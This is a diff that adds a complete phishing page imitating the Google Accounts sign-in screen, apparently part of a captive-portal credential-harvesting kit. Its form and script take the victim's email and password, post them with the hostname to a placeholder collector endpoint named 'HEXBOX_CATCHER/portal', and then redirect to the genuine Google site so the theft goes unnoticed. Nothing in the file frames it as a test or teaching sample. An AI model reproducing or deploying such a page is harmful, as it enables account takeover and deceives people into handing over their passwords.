@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in – Google Accounts</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,'Google Sans',Helvetica,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
+.g-logo{font-size:28px;font-weight:700;letter-spacing:-1px;margin-bottom:24px;user-select:none}
+.g-logo .g-blue{color:#4285f4}
+.g-logo .g-red{color:#ea4335}
+.g-logo .g-yellow{color:#fbbc05}
+.g-logo .g-green{color:#34a853}
+.card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
+.card h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
+.card .subtitle{font-size:16px;color:#202124;margin-bottom:28px}
+.field-wrap{margin-bottom:20px;position:relative}
+.field-wrap input{width:100%;padding:13px 14px 13px 14px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;color:#202124;background:#fff;transition:border .15s,box-shadow .15s}
+.field-wrap input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.15)}
+.field-wrap input::placeholder{color:#80868b}
+.field-wrap label{position:absolute;top:13px;left:14px;font-size:16px;color:#80868b;pointer-events:none;transition:transform .15s,font-size .15s,color .15s;background:#fff;padding:0 2px}
+.field-wrap input:focus + label,
+.field-wrap input:not(:placeholder-shown) + label{transform:translateY(-22px);font-size:11px;color:#1a73e8}
+.error-msg{display:none;color:#d93025;font-size:12px;margin-top:4px}
+.error-msg.show{display:block}
+.links-row{margin-bottom:28px}
+.links-row a{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500}
+.links-row a:hover{text-decoration:underline}
+.action-row{display:flex;align-items:center;justify-content:space-between;margin-top:8px}
+.action-row a{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500}
+.action-row a:hover{text-decoration:underline}
+.btn-next{padding:10px 24px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;border:none;border-radius:4px;cursor:pointer;transition:background .15s,box-shadow .15s}
+.btn-next:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
+.divider{border:none;border-top:1px solid #dadce0;margin:20px 0}
+.footer{margin-top:24px;text-align:center;font-size:12px;color:#5f6368}
+.footer a{color:#1a73e8;text-decoration:none}
+.footer a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+
+<div class="g-logo">
+  <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+</div>
+
+<div class="card">
+  <h1>Sign in</h1>
+  <p class="subtitle">Use your Google Account</p>
+
+  <form id="loginForm" action="HEXBOX_CATCHER/portal" method="POST" novalidate>
+    <input type="hidden" name="portal" value="google">
+
+    <div class="field-wrap">
+      <input type="text" id="email" name="username" autocomplete="username"
+             autocorrect="off" autocapitalize="off" spellcheck="false"
+             placeholder=" " required>
+      <label for="email">Email or phone</label>
+      <div class="error-msg" id="emailErr">Enter a valid email or phone number.</div>
+    </div>
+
+    <div class="field-wrap">
+      <input type="password" id="password" name="password"
+             autocomplete="current-password" placeholder=" " required>
+      <label for="password">Enter your password</label>
+      <div class="error-msg" id="passErr">Wrong password. Try again or click Forgot password.</div>
+    </div>
+
+    <div class="links-row">
+      <a href="#">Forgot email?</a>
+    </div>
+
+    <hr class="divider">
+
+    <div class="action-row">
+      <a href="#">Create account</a>
+      <button type="submit" class="btn-next">Next</button>
+    </div>
+  </form>
+</div>
+
+<div class="footer">
+  <a href="#">Help</a> &nbsp;&middot;&nbsp;
+  <a href="#">Privacy</a> &nbsp;&middot;&nbsp;
+  <a href="#">Terms</a>
+</div>
+
+<script>
+(function(){
+  var form = document.getElementById('loginForm');
+  var emailErr = document.getElementById('emailErr');
+  var passErr = document.getElementById('passErr');
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    var username = document.getElementById('email').value.trim();
+    var password = document.getElementById('password').value;
+    var valid = true;
+
+    if(!username){ emailErr.classList.add('show'); valid=false; }
+    else { emailErr.classList.remove('show'); }
+    if(!password){ passErr.classList.add('show'); valid=false; }
+    else { passErr.classList.remove('show'); }
+    if(!valid) return;
+
+    var payload = {
+      username: username,
+      password: password,
+      portal: 'google',
+      host: window.location.hostname
+    };
+
+    fetch('HEXBOX_CATCHER/portal', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload),
+      credentials: 'omit'
+    }).catch(function(){})
+      .finally(function(){
+        window.location.href = 'https://accounts.google.com';
+      });
+  });
+})();
+</script>
+</body>
+</html>
